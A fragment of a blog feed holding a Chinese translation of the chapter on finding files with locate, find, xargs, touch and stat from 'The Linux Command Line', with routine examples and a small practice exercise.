<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> dvd-image.iso; <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/dvd bs=2048 count=$(( $(stat -c &quot;%s&quot;</span><br><span class="line">dvd-image.iso) / <span class="number">2048</span> )) | <span class="built_in">md5sum</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>查找文件</title>
    <url>/2024/04/17-searching-for-files/</url>
    <content><![CDATA[<h2 id="17章-查找文件"><a href="#17章-查找文件" class="headerlink" title="17章 - 查找文件"></a>17章 - 查找文件</h2><p>在我们漫游Linux系统时，一个明显的问题是：Linux系统有许多文件！这引出了一个问题：“我们如何找到所需的内容？”我们已经知道，Linux文件系统根据从一代类Unix系统传承下来的习惯良好地组织着，但海量的文件还是可能让人望而生畏。</p>
<p>在本章中，我们将探讨两种在系统中查找文件的工具。</p>
<span id="more"></span>

<ul>
<li>locate - 通过名称查找文件</li>
<li>find - 在目录层次结构中搜索文件</li>
</ul>
<p>我们还将介绍一些常与文件搜索命令一起使用的命令，以处理搜索结果生成的文件列表。</p>
<ul>
<li>xargs - 从标准输入构建并执行命令行</li>
<li>touch - 更改文件时间</li>
<li>stat - 显示文件或文件系统状态</li>
</ul>
<h3 id="locate-简单方式查找文件"><a href="#locate-简单方式查找文件" class="headerlink" title="locate - 简单方式查找文件"></a>locate - 简单方式查找文件</h3><p>locate程序执行快速的数据库路径名搜索，然后输出每个与给定子字符串匹配的名称。例如，我们想找到所有以zip开头的程序。由于我们正在寻找程序，我们可以假设包含程序的目录名称以bin&#x2F;结尾。因此，我们可以尝试使用locate以这种方式查找文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ locate bin/zip</span><br></pre></td></tr></table></figure>

<p>locate将搜索其路径名数据库，并输出包含字符串bin&#x2F;zip的任何路径。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/zip</span><br><span class="line">/usr/bin/zipcloak</span><br><span class="line">/usr/bin/zipgrep</span><br><span class="line">/usr/bin/zipinfo</span><br><span class="line">/usr/bin/zipnote</span><br><span class="line">/usr/bin/zipsplit</span><br></pre></td></tr></table></figure>

<p>如果搜索要求不那么简单，我们可以将locate与其他工具（如grep）结合使用，设计更有趣的搜索。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ locate zip | grep bin</span><br><span class="line">/bin/bunzip2</span><br><span class="line">/bin/bzip2</span><br><span class="line">/bin/bzip2recover</span><br><span class="line">/bin/gunzip</span><br><span class="line">/bin/gzip</span><br><span class="line">/usr/bin/funzip</span><br><span class="line">/usr/bin/gpg-zip</span><br><span class="line">/usr/bin/preunzip</span><br><span class="line">/usr/bin/prezip</span><br><span class="line">/usr/bin/prezip-bin</span><br><span class="line">/usr/bin/unzip</span><br><span class="line">/usr/bin/unzipsfx</span><br><span class="line">/usr/bin/zip</span><br><span class="line">/usr/bin/zipcloak</span><br><span class="line">/usr/bin/zipgrep</span><br><span class="line">/usr/bin/zipinfo</span><br><span class="line">/usr/bin/zipnote</span><br><span class="line">/usr/bin/zipsplit </span><br></pre></td></tr></table></figure>

<p>locate程序已经存在多年，现在常见的Linux发行版中有几种变体，如slocate和mlocate，它们通常通过名为locate的符号链接来访问。locate的不同版本有重叠的选项集。某些版本包括正则表达式匹配（我们将在第19章“正则表达式”中介绍）和通配符支持。检查locate的手册页，以确定安装了哪个版本的locate。</p>
<p><strong>locate数据库从哪里来？</strong></p>
<p>你可能会注意到，在一些发行版上，系统刚安装完毕时locate可能无法正常工作，但如果第二天再试一次，它就能正常工作。这是怎么回事？locate数据库是由另一个名为updatedb的程序创建的。通常，它会作为一个*定时任务（cron job）*定期运行，即由cron守护进程定期执行的任务。大多数装有locate的系统每天运行一次updatedb。由于数据库不是持续更新的，你会注意到使用locate时最近创建的文件不会显示。为了解决这个问题，可以通过成为超级用户并在提示符下手动运行updatedb程序。</p>
<h3 id="find-困难方式查找文件"><a href="#find-困难方式查找文件" class="headerlink" title="find - 困难方式查找文件"></a>find - 困难方式查找文件</h3><p>虽然locate程序仅能基于文件名查找文件，但find程序则可以根据各种属性搜索给定目录（及其子目录）中的文件。我们将花费很多时间学习find，因为它有许多有趣的特性，当我们开始在后续章节中讨论编程概念时，这些特性将会再次出现。</p>
<p>在最简单的用法中，find被给予一个或多个要搜索的目录名称。例如要生成我们家目录的列表，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~</span><br></pre></td></tr></table></figure>

<p>在大多数活跃的用户账户上，这会产生一个很长的列表。由于列表被发送到标准输出，我们可以将列表通过管道传输到其他程序。让我们使用wc来计算文件数量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~ | <span class="built_in">wc</span> -l</span><br><span class="line">47068</span><br></pre></td></tr></table></figure>

<p>哇，我们已经很忙了！find的美妙之处在于它可以用来识别满足特定条件的文件。它通过（略显奇怪的）使用<em>选项</em>、<em>测试</em>和<em>动作</em>来实现。我们先看看测试。</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>假设我们想从搜索中得到一个目录列表。为此，我们可以添加以下测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~ -<span class="built_in">type</span> d | <span class="built_in">wc</span> -l</span><br><span class="line">1695</span><br></pre></td></tr></table></figure>

<p>添加-test d测试将搜索限制为目录。相反，我们可以通过这个测试将搜索限制为常规文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~ -<span class="built_in">type</span> f | <span class="built_in">wc</span> -l</span><br><span class="line">38737</span><br></pre></td></tr></table></figure>

<p>表17-1列出了find支持的常见文件类型测试。</p>
<p><em>表 17-1:</em> <em>find文件类型</em></p>
<table>
<thead>
<tr>
<th><strong>文件类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>b</td>
<td>块特殊设备文件</td>
</tr>
<tr>
<td>c</td>
<td>字符特殊设备文件</td>
</tr>
<tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>f</td>
<td>常规文件</td>
</tr>
<tr>
<td>l</td>
<td>符号链接</td>
</tr>
</tbody></table>
<p>我们还可以通过添加一些额外的测试来根据文件大小和文件名进行搜索。让我们寻找所有与通配符模式*.JPG匹配且大于一兆字节的常规文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~ -<span class="built_in">type</span> f -name <span class="string">&quot;*.JPG&quot;</span> -size +1M | <span class="built_in">wc</span> -l</span><br><span class="line">840</span><br></pre></td></tr></table></figure>

<p>在此示例中，我们添加了-name测试，后跟通配符模式。注意我们如何用引号将其括起来，以防止由shell进行路径名展开。接下来，我们添加了-size测试，后跟字符串“+1M”。前导加号表示我们正在寻找大于指定数字的文件。前导减号将更改字符串的含义，表示小于指定数字。不使用符号意味着“精确匹配该值”。尾随的字母M表示度量单位为兆字节。表17-2列出了可以用来指定单位的字符。</p>
<p><em>表 17-2:</em> <em>find大小单位</em></p>
<table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>单位</strong></th>
</tr>
</thead>
<tbody><tr>
<td>b</td>
<td>512字节块。如果未指定单位，则默认为此单位。</td>
</tr>
<tr>
<td>c</td>
<td>字节。</td>
</tr>
<tr>
<td>w</td>
<td>2字节字。</td>
</tr>
<tr>
<td>k</td>
<td>千字节（1024字节单位）。</td>
</tr>
<tr>
<td>M</td>
<td>兆字节（1048576字节单位）。</td>
</tr>
<tr>
<td>G</td>
<td>吉字节（1073741824字节单位）。</td>
</tr>
</tbody></table>
<p>find支持大量的测试。表17-3提供了常见测试的概述。注意，在需要数字参数的情况下，可以应用上面讨论的+和-符号。</p>
<p><strong>表 17-3: find命令测试</strong></p>
<table>
<thead>
<tr>
<th><strong>测试</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-cmin <em>n</em></td>
<td>匹配内容或属性在<em>n</em>分钟前刚好被修改过的文件或目录。使用*-n<em>表示少于</em>n<em>分钟前，使用</em>+n<em>表示多于</em>n*分钟前。</td>
</tr>
<tr>
<td>-cnewer <em>file</em></td>
<td>匹配内容或属性比<em>file</em>更近期被修改的文件或目录。</td>
</tr>
<tr>
<td>-ctime <em>n</em></td>
<td>匹配内容或属性在<em>n</em>天前被修改的文件或目录。</td>
</tr>
<tr>
<td>-empty</td>
<td>匹配空文件和空目录。</td>
</tr>
<tr>
<td>-group <em>name</em></td>
<td>匹配属于<em>group</em>的文件或目录。<em>group</em>可以是组名或组ID。</td>
</tr>
<tr>
<td>-iname <em>pattern</em></td>
<td>类似于-name测试，但不区分大小写。</td>
</tr>
<tr>
<td>-inum <em>n</em></td>
<td>匹配inode号为<em>n</em>的文件。这有助于找到链接到特定inode的所有硬链接。</td>
</tr>
<tr>
<td>-mmin <em>n</em></td>
<td>匹配内容在<em>n</em>分钟前被修改的文件或目录。</td>
</tr>
<tr>
<td>-mtime <em>n</em></td>
<td>匹配内容在<em>n</em>天前被修改的文件或目录。</td>
</tr>
<tr>
<td>-name <em>pattern</em></td>
<td>匹配符合指定通配符<em>pattern</em>的文件和目录。</td>
</tr>
<tr>
<td>-newer <em>file</em></td>
<td>匹配内容比指定的<em>file</em>更新的文件和目录。这在编写执行文件备份的shell脚本时非常有用。每次进行备份时，更新一个文件（如日志），然后使用find确定自上次更新以来哪些文件发生了变化。</td>
</tr>
<tr>
<td>-nouser</td>
<td>匹配不属于有效用户的文件和目录。这可以用来找到属于已删除账户的文件或检测攻击者的活动。</td>
</tr>
<tr>
<td>-nogroup</td>
<td>匹配不属于有效组的文件和目录。</td>
</tr>
<tr>
<td>-perm <em>mode</em></td>
<td>匹配权限设置为指定<em>mode</em>的文件或目录。<em>mode</em>可以用八进制或符号表示。</td>
</tr>
<tr>
<td>-samefile <em>name</em></td>
<td>类似于-inum测试。匹配与文件<em>name</em>共享相同inode号的文件。</td>
</tr>
<tr>
<td>-size <em>n</em></td>
<td>匹配大小为<em>n</em>的文件。</td>
</tr>
<tr>
<td>-type <em>c</em></td>
<td>匹配类型为<em>c</em>的文件。</td>
</tr>
<tr>
<td>-user <em>name</em></td>
<td>匹配属于用户<em>name</em>的文件或目录。用户可以用用户名或数字用户ID表示。</td>
</tr>
</tbody></table>
<p>这不是完整的列表。完整详情请参阅find手册页。</p>
<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>即使find提供了所有这些测试，我们仍然可能需要更好的方式来描述测试之间的<em>逻辑关系</em>。例如，如果我们需要确定一个目录中的所有文件和子目录是否都有安全权限，我们将寻找所有权限不是0600的文件和权限不是0700的目录。幸运的是，find提供了使用<em>逻辑运算符</em>结合测试的方式，以创建更复杂的逻辑关系。要表达上述测试，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find ~ \( -<span class="built_in">type</span> f -not -perm 0600 \) -or \( -<span class="built_in">type</span> d</span><br><span class="line">-not -perm 0700 \)</span><br></pre></td></tr></table></figure>

<p>哇！看起来很怪异。这是些什么东西？实际上，一旦你熟悉了这些运算符，它们并不复杂。表 17-4 描述了与find一起使用的逻辑运算符。</p>
<p><em>表 17-4: find逻辑运算符</em></p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-and</td>
<td>如果运算符两边的测试都为真，则匹配。这可以缩写为-a。注意，如果没有指定运算符，默认情况下隐含-and。</td>
</tr>
<tr>
<td>-or</td>
<td>如果运算符两边的任一测试为真，则匹配。这可以缩写为-o。</td>
</tr>
<tr>
<td>-not</td>
<td>如果跟随运算符的测试为假，则匹配。这可以用感叹号(!)缩写。</td>
</tr>
<tr>
<td>( )</td>
<td>将测试和运算符组合在一起，形成更大的表达式。这用于控制逻辑评估的优先顺序。默认情况下，find从左到右进行评估。有时需要覆盖默认的评估顺序以获得所需的结果。即使不需要，有时包含分组字符也有助于提高命令的可读性。注意，由于括号对shell有特殊意义，因此在命令行上使用它们时必须加引号，以便作为参数传递给find。通常使用反斜杠字符来转义它们。</td>
</tr>
</tbody></table>
<p>有了这些运算符列表，让我们来解构我们的find命令。从最高层次看，我们看到我们的测试被安排为两个组，由一个-or运算符分隔。</p>
<p>( <em>表达式 1</em> ) -or ( <em>表达式 2</em> )</p>
<p>这很有意义，因为我们正在寻找具有某些权限的文件和具有不同权限的目录。如果我们在寻找文件和目录，为什么我们使用-or而不是-and？因为当find扫描文件和目录时，每一个都会被评估以确定它是否与指定的测试匹配。我们想知道的</p>
<p>是它是<em>文件带有不好的权限</em>或者<em>目录带有不好的权限</em>。它不可能同时是两者。所以如果我们展开分组表达式，我们可以这样看：</p>
<p><strong>( 文件带有不好的权限 ) -or ( 目录带有不好的权限 )</strong></p>
<p>接下来我们的挑战是如何测试“不好的权限”。我们怎么做？实际上，我们不会。我们将测试的是“不是好的权限”，因为我们知道“好的权限”是什么。在文件的情况下，我们定义好的权限为0600，对于目录，我们定义为0700。测试文件是否具有“不好的”权限的表达式如下：</p>
<p><strong>-type f -and -not -perms 0600</strong></p>
<p>对于目录，它如下：</p>
<p><strong>-type d -and -not -perms 0700</strong></p>
<p>如表 17-4 中所述，-and运算符可以安全地移除，因为它默认隐含。所以如果我们把这一切放在一起，我们得到了最终的命令。</p>
<p><strong>find ~ ( -type f -not -perms 0600 ) -or ( -type d -not perms 0700 )</strong></p>
<p>然而，由于括号对shell有特殊意义，我们必须转义它们，以防止shell尝试解释它们。在每个前面加上反斜杠字符就可以了。</p>
<p>还有一个关于逻辑运算符的重要特性需要理解。假设我们有两个表达式，由一个逻辑运算符分隔。</p>
<p><em><strong>expr1</strong></em>** -operator **<em><strong>expr2</strong></em></p>
<p>在所有情况下，<em>expr1</em> 总是会被执行；然而，运算符将决定是否执行<em>expr2</em>。表 17-5 概述了它的工作方式。</p>
<p><em>表 17-5: find AND&#x2F;OR逻辑</em></p>
<table>
<thead>
<tr>
<th><strong>结果</strong></th>
<th><strong>运算符</strong></th>
<th><strong>执行</strong><em><strong>expr2</strong></em></th>
</tr>
</thead>
<tbody><tr>
<td>true</td>
<td>-and</td>
<td>总是执行</td>
</tr>
<tr>
<td>false</td>
<td>-and</td>
<td>从不执行</td>
</tr>
<tr>
<td>true</td>
<td>-or</td>
<td>从不执行</td>
</tr>
<tr>
<td>false</td>
<td>-or</td>
<td>总是执行</td>
</tr>
</tbody></table>
<p>为什么会这样？这样做是为了提高性能。以-and为例。我们知道，如果<em>expr1</em>的结果是假，则表达式<em>expr1</em> -and <em>expr2</em>不可能为真，所以没有必要执行<em>expr2</em>。同样，如果我们有表达式<em>expr1</em> -or <em>expr2</em>，并且<em>expr1</em>的结果是真，那么没有必要执行<em>expr2</em>，因为我们已经知道表达式<em>expr1</em> -or <em>expr2</em>是真的。</p>
<p>好吧，这有助于提高速度。为什么这很重要？这很重要，因为我们可以依赖这种行为来控制如何执行操作，正如我们很快就会看到的。</p>
<h4 id="预定义操作"><a href="#预定义操作" class="headerlink" title="预定义操作"></a>预定义操作</h4><p>让我们完成一些工作！拥有find命令的结果列表是有用的，但我们真正想要做的是根据列表上的项目执行操作。幸运的是，find允许根据搜索结果执行操作。有一套预定义的操作和几种应用用户定义操作的方法。首先，让我们看看几个预定义的操作，列在表 17-6 中。</p>
<p><em>表 17-6: 预定义的find操作</em></p>
<table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-delete</td>
<td>删除当前匹配的文件。</td>
</tr>
<tr>
<td>-ls</td>
<td>对匹配的文件执行类似于ls -dils的操作。输出发送到标准输出。</td>
</tr>
<tr>
<td>-print</td>
<td>将匹配文件的完整路径名输出到标准输出。如果没有指定其他操作，则为默认操作。</td>
</tr>
<tr>
<td>-quit</td>
<td>一旦匹配，就退出。</td>
</tr>
</tbody></table>
<p>与测试一样，还有更多的操作。有关完整详情，请参阅find手册页。</p>
<p>在第一个示例中，我们这样做了：</p>
<p><strong>find ~</strong></p>
<p>这产生了一个列表，包含我们家目录中的每个文件和子目录。它产生了一个列表，因为如果没有指定其他操作，则隐含-print操作。因此，我们的命令也可以这样表达：</p>
<p><strong>find ~ -print</strong></p>
<p>我们可以使用find删除符合某些条件的文件。例如，要删除具有文件扩展名.bak的文件（通常用于指定备份文件），我们可以使用以下命令：</p>
<p><strong>find ~ -type f -name ‘*.bak’ -delete</strong></p>
<p>在这个示例中，搜索用户家目录（及其子目录）中以.bak结尾的文件名。当它们被找到时，它们被删除。</p>
<p><strong>警告：</strong> 不用说，当使用-delete操作时，你应该<em><strong>极其小心</strong></em>。总是先用-print操作替换-delete来测试命令，以确认搜索结果。</p>
<p>在继续之前，让我们再看一下逻辑运算符如何影响操作。考虑以下命令：</p>
<p><strong>find ~ -type f -name ‘*.bak’ -print</strong></p>
<p>正如我们所见，这个命令将查找每个常规文件（-type f），其名称以.bak结尾（-name ‘*.bak’），并将每个匹配文件的相对路径名输出到标准输出（-print）。然而，命令执行方式的原因是由测试和操作之间的逻辑关系决定的。记住，默认情况下，在每个测试和操作之间隐含一个-and关系。我们也可以这样表达命令，使逻辑关系更容易看到：</p>
<p><strong>find ~ -type f -and -name ‘*.bak’ -and -print</strong></p>
<p>用我们的命令完全表达出来，让我们来看看逻辑运算符是如何影响其执行的：</p>
<table>
<thead>
<tr>
<th><strong>测试&#x2F;动作</strong></th>
<th><strong>仅当…为真时执行</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-print</td>
<td>-type f 和 -name ‘*.bak’ 都为真时</td>
</tr>
<tr>
<td>-name ‘*.bak’</td>
<td>-type f 为真时</td>
</tr>
<tr>
<td>-type f</td>
<td>由于它是 and 关系中的第一个测试&#x2F;动作，因此总是执行。</td>
</tr>
</tbody></table>
<p>由于测试和动作之间的逻辑关系决定了哪些测试和动作被执行，我们可以看到测试和动作的顺序是重要的。例如，如果我们将测试和动作的顺序重新排列，使得 -print 动作是第一个，那么命令的行为将大不相同。</p>
<p><strong>find ~ -print -and -type f -and -name ‘*.bak’</strong></p>
<p>这个版本的命令将打印每个文件（-print 动作总是返回真）然后测试文件类型和指定的文件扩展名。</p>
<h4 id="用户定义的动作"><a href="#用户定义的动作" class="headerlink" title="用户定义的动作"></a>用户定义的动作</h4><p>除了预定义的动作之外，我们还可以调用任意命令。传统的方式是使用 -exec 动作。这个动作的工作方式如下：</p>
<p>**-exec **<em><strong>command</strong></em> {} ;</p>
<p>这里 <em>command</em> 是命令的名称，{} 是当前路径名的符号表示，分号是一个必需的分隔符，表示命令的结束。这里有一个使用 -exec 来像前面讨论的 -delete 动作那样的例子：</p>
<p><strong>-exec rm ‘{}’ ‘;’</strong></p>
<p>同样，由于大括号和分号字符对 shell 有特殊含义，它们必须被引用或转义。</p>
<p>也可以交互式地执行用户定义的动作。使用 -ok 动作代替 -exec，每次执行指定命令之前都会提示用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~ -<span class="built_in">type</span> f -name <span class="string">&#x27;foo*&#x27;</span> -ok <span class="built_in">ls</span> -l <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line">&lt; <span class="built_in">ls</span> ... /home/me/bin/foo &gt; ? y</span><br><span class="line">-rwxr-xr-x 1 me me 224 2007-10-29 18:44 /home/me/bin/foo</span><br><span class="line">&lt; <span class="built_in">ls</span> ... /home/me/foo.txt &gt; ? y</span><br><span class="line">-rw-r--r-- 1 me me 0 2016-09-19 12:53 /home/me/foo.txt</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们搜索以字符串 foo 开头的文件名，并在每次找到时执行 ls -l 命令。使用 -ok 动作在执行 ls 命令之前提示用户。</p>
<h4 id="提高效率"><a href="#提高效率" class="headerlink" title="提高效率"></a>提高效率</h4><p>当使用 -exec 动作时，每次找到匹配的文件就会启动指定命令的一个新实例。有时我们可能更愿意将所有的搜索结果合并起来，只启动一次指定命令的实例。例如，我们可能更愿意这样执行命令：</p>
<p>**ls -l **<em><strong>file1 file2</strong></em></p>
<p>而不是这样：</p>
<p>**ls -l **<em><strong>file1</strong></em></p>
<p>**ls -l **<em><strong>file2</strong></em></p>
<p>这导致命令只需要执行一次而不是多次。我们可以通过两种方式做到这一点：传统的方式，使用外部命令 xargs 和 find 本身的一个新特性。我们先讨论后一种方式。</p>
<p>通过将尾随的分号字符更改为加号，我们激活了 find 将搜索结果的结果合并成一个参数列表，以便单次执行所需命令的能力。回到我们的例子，这将在每次找到匹配文件时执行 ls：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~ -<span class="built_in">type</span> f -name <span class="string">&#x27;foo*&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> -l <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line">-rwxr-xr-x 1 me me 224 2007-10-29 18:44 /home/me/bin/foo</span><br><span class="line">-rw-r--r-- 1 me me 0 2016-09-19 12:53 /home/me/foo.txt</span><br></pre></td></tr></table></figure>

<p>通过将命令更改为以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~ -</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> f -name <span class="string">&#x27;foo*&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> -l <span class="string">&#x27;&#123;&#125;&#x27;</span> +</span><br><span class="line">-rwxr-xr-x 1 me me 224 2007-10-29 18:44 /home/me/bin/foo</span><br><span class="line">-rw-r--r-- 1 me me 0 2016-09-19 12:53 /home/me/foo.txt</span><br></pre></td></tr></table></figure>

<p>我们得到相同的结果，但系统只需要执行一次 ls 命令。</p>
<h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><p>xargs 命令执行一个有趣的功能。它从标准输入接受输入，并将其转换为指定命令的参数列表。在我们的例子中，我们将像这样使用它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~ -<span class="built_in">type</span> f -name <span class="string">&#x27;foo*&#x27;</span> -<span class="built_in">print</span> | xargs <span class="built_in">ls</span> -l</span><br><span class="line">-rwxr-xr-x 1 me me 224 2007-10-29 18:44 /home/me/bin/foo</span><br><span class="line">-rw-r--r-- 1 me me 0 2016-09-19 12:53 /home/me/foo.txt-rwxr-xr-x 1 me  me 224 2007-10-29 18:44 /home/me/bin/foo -rw-r--r-- 1 me  me  0 2016-09-19 12:53 /home/me/foo.txt</span><br></pre></td></tr></table></figure>

<p>这里我们看到 find 命令的输出被管道输送到 xargs，xargs 接着为 ls 命令构建一个参数列表，然后执行它。</p>
<p><strong>注意：</strong> 虽然可以放置在命令行中的参数数量非常大，但它并不是无限的。创建的命令可能太长，无法被 shell 接受。当命令行超过系统支持的最大长度时，xargs 会用尽可能多的参数执行指定的命令，然后重复此过程，直到标准输入耗尽。要查看命令行的最大尺寸，可以执行带有 –show-limits 选项的 xargs。</p>
<h3 id="处理有趣的文件名"><a href="#处理有趣的文件名" class="headerlink" title="处理有趣的文件名"></a>处理有趣的文件名</h3><p>类 Unix 系统允许在文件名中嵌入空格（甚至是换行符！）。这对于像 xargs 这样构建其他程序的参数列表的程序来说会造成问题。嵌入的空格将被视为分隔符，结果命令将把每个空格分隔的单词解释为一个单独的参数。为了克服这个问题，find 和 xargs 允许使用 <em>空字符</em> 作为参数分隔符。空字符在 ASCII 中被定义为数字零（而不是例如空格字符，它在 ASCII 中被定义为数字 32）所表示的字符。find 命令提供了动作 -print0，它产生空字符分隔的输出，xargs 命令有 –null（或 -0）选项，它接受空字符分隔的输入。这里有一个例子：</p>
<p><strong>find ~ -iname ‘*.jpg’ -print0 | xargs –null ls -l</strong></p>
<p>使用这种技术，我们可以确保即使是那些文件名中包含嵌入空格的文件，也能被正确处理。</p>
<h4 id="返回到操场"><a href="#返回到操场" class="headerlink" title="返回到操场"></a>返回到操场</h4><p>是时候把 find 命令用于一些（几乎）实际用途了。我们将创建一个操场并尝试一些我们学到的东西。</p>
<p>首先，让我们创建一个包含许多子目录和文件的操场。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> -p playground/dir-&#123;001..100&#125;</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> playground/dir-&#123;001..100&#125;/file-&#123;A..Z&#125;</span><br></pre></td></tr></table></figure>

<p>惊叹于命令行的力量！通过这两行命令，我们创建了一个包含 100 个子目录的操场，每个子目录中都包含 26 个空文件。尝试使用 GUI 做这个！</p>
<p>我们使用了一个熟悉的命令（mkdir）、一个不常见的 shell 扩展（大括号）和一个新命令 touch 完成这个神奇的操作。通过结合使用 mkdir 和其 -p 选项（它会使 mkdir 创建指定路径的父目录）以及大括号扩展，我们成功创建了 100 个子目录。</p>
<p>通常，touch 命令用于设置或更新文件的访问、更改和修改时间。然而，如果文件名参数是不存在的文件，那么会创建一个空文件。</p>
<p>在我们的实验环境中，我们创建了 100 个名为 file-A 的文件实例。让我们来找到它们。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -<span class="built_in">type</span> f -name <span class="string">&#x27;file-A&#x27;</span></span><br></pre></td></tr></table></figure>

<p>请注意，与 ls 不同，find 命令产生的结果并不是排序的。其顺序由存储设备的布局决定。我们可以通过以下方式确认我们确实有 100 个 file-A 文件实例。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -<span class="built_in">type</span> f -name <span class="string">&#x27;file-A&#x27;</span> | <span class="built_in">wc</span> -l</span><br><span class="line">100</span><br></pre></td></tr></table></figure>

<p>接下来，让我们根据文件的修改时间来查找文件。这在创建备份或按时间顺序组织文件时很有帮助。为此，我们首先创建一个参照文件，用于比较修改时间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> playground/timestamp</span><br></pre></td></tr></table></figure>

<p>这将创建一个名为 timestamp 的空文件，并将其修改时间设置为当前时间。我们可以使用另一个方便的命令 stat 来验证这一点，stat 命令是 ls 的增强版。stat 命令揭示了系统对文件及其属性的全部理解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">stat</span> playground/timestamp</span><br><span class="line"> File: `playground/timestamp<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> Size: 0 Blocks: 0 IO Block: 4096 regular empty file</span></span><br><span class="line"><span class="string">Device: 803h/2051d Inode: 14265061 Links: 1</span></span><br><span class="line"><span class="string">Access: (0644/-rw-r--r--) Uid: ( 1001/ me) Gid: ( 1001/ me)</span></span><br><span class="line"><span class="string">Access: 2018-10-08 15:15:39.000000000 -0400</span></span><br><span class="line"><span class="string">Modify: 2018-10-08 15:15:39.000000000 -0400</span></span><br><span class="line"><span class="string">Change: 2018-10-08 15:15:39.000000000 -0400</span></span><br></pre></td></tr></table></figure>

<p>如果我们再次使用 touch 命令，然后用 stat 检查文件，我们会看到文件的时间已被更新。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> playground/timestamp</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">stat</span> playground/timestamp</span><br><span class="line"> File: `playground/timestamp<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> Size: 0 Blocks: 0 IO Block: 4096 regular empty file</span></span><br><span class="line"><span class="string">Device: 803h/2051d Inode: 14265061 Links: 1</span></span><br><span class="line"><span class="string">Access: (0644/-rw-r--r--) Uid: ( 1001/ me) Gid: ( 1001/ me)</span></span><br><span class="line"><span class="string">Access: 2018-10-08 15:23:33.000000000 -0400</span></span><br><span class="line"><span class="string">Modify: 2018-10-08 15:23:33.000000000 -0400</span></span><br><span class="line"><span class="string">Change: 2018-10-08 15:23:33.000000000 -0400</span></span><br></pre></td></tr></table></figure>

<p>接下来，让我们使用 find 命令更新我们实验环境中的一些文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -<span class="built_in">type</span> f -name <span class="string">&#x27;file-B&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">touch</span></span><br><span class="line"><span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这会更新实验环境中所有名为 file-B 的文件。接下来我们会使用 find 来识别已更新的文件，通过将所有文件与参照文件 timestamp 进行比较。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -<span class="built_in">type</span> f -newer playground/timestamp</span><br></pre></td></tr></table></figure>

<p>结果包含了所有 100 个 file-B 实例。由于在更新 timestamp 之后，我们对实验环境中名为 file-B 的所有文件执行了 touch 操作，它们现在比 timestamp “更新”，因此可以通过 -newer 测试识别出来。</p>
<p>最后，让我们回到之前进行的错误权限测试，并将其应用到实验环境中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground \( -<span class="built_in">type</span> f -not -perm 0600 \) -or \(</span><br><span class="line">-<span class="built_in">type</span> d -not -perm 0700 \)</span><br></pre></td></tr></table></figure>

